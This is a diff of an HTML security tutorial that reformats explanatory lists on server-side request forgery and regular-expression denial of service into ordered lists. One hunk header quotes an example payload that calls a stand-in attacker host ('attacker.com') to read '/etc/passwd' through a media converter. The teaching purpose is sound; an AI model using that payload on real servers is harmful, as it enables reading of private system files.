@@ -87,12 +87,15 @@ code span.wa { color: #60a0b0; font-weight: bold; font-style: italic; } /* Warni
   (SSRF)</h2>
   <p>Server-Side Request Forgery (SSRF) occurs when attackers can cause
   the server to send requests to arbitrary URLs. This is particularly
-  dangerous in cloud environments because: 1. The server might have
-  access to other internal services, such as sensitive databases, that
-  aren’t meant to be publicly accessible 2. Internal services typically
-  have minimal security because they assume requests only come from
-  trusted sources 3. Network firewalls and access controls don’t protect
-  against requests coming from within the network</p>
+  dangerous in cloud environments because:</p>
+  <ol type="1">
+  <li>The server might have access to other internal services, such as
+  sensitive databases, that aren’t meant to be publicly accessible</li>
+  <li>Internal services typically have minimal security because they
+  assume requests only come from trusted sources</li>
+  <li>Network firewalls and access controls don’t protect against
+  requests coming from within the network</li>
+  </ol>
   <h3 id="example-vulnerability">Example Vulnerability</h3>
   <p>Consider a document conversion service that converts HTML to
   PDF:</p>
@@ -257,13 +260,18 @@ concat:http://attacker.com/header.m3u8|subfile,,start,1,end,10000,,:/etc/passwd
   Denial of Service (ReDoS)</h2>
   <p>Regular Expression Denial of Service (ReDoS) occurs when a regular
   expression can take exponential time to match certain inputs. This
-  vulnerability is particularly severe in Node.js for several reasons:
-  1. Node.js processes regex matching on the main event loop, so a slow
-  regex blocks ALL requests to the server 2. JavaScript’s regex engine
-  uses backtracking, which can lead to exponential matching time 3. Many
-  Node.js applications use regex for input validation, making this a
-  common attack vector 4. The single-threaded nature of Node.js means
-  one blocked request will stall the server for all users</p>
+  vulnerability is particularly severe in Node.js for several
+  reasons:</p>
+  <ol type="1">
+  <li>Node.js processes regex matching on the main event loop, so a slow
+  regex blocks ALL requests to the server</li>
+  <li>JavaScript’s regex engine uses backtracking, which can lead to
+  exponential matching time</li>
+  <li>Many Node.js applications use regex for input validation, making
+  this a common attack vector</li>
+  <li>The single-threaded nature of Node.js means one blocked request
+  will stall the server for all users</li>
+  </ol>
   <h3 id="catastrophic-backtracking">Catastrophic backtracking</h3>
   <p>ReDoS is caused by regular expressions that might match a target
   string in many different ways. Certain regex patterns allow for a vast
